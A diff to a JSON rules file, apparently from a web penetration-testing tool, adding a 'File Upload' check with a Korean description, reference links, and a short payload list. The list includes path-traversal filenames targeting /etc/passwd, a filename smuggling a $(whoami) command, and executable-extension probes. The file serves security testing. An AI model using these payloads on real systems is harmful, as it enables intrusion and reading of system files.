@@ -126,5 +126,18 @@
         "reference" : [
             "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token"
         ]
+    },
+    "File Upload" : {
+        "description" : "request 패킷에 file upload 기능이 존재합니다. file upload 공격 가능 여부를 확인해야 합니다.<br>php 인 경우 [.php, .phar], jsp 인 경우 [.jsp, jspx] 등과 같은 확장자가 업로드 가능한지 테스트해야 합니다.",
+        "payload" : [
+            "filename=/etc/passwd",
+            "filename=../../../../../../etc/passwd",
+            "a$(whoami)z.png",
+            "filenam=test.[php, phar, jsp, jspx]"
+        ],
+        "reference" : [
+            "https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities",
+            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        ]
     }
 }
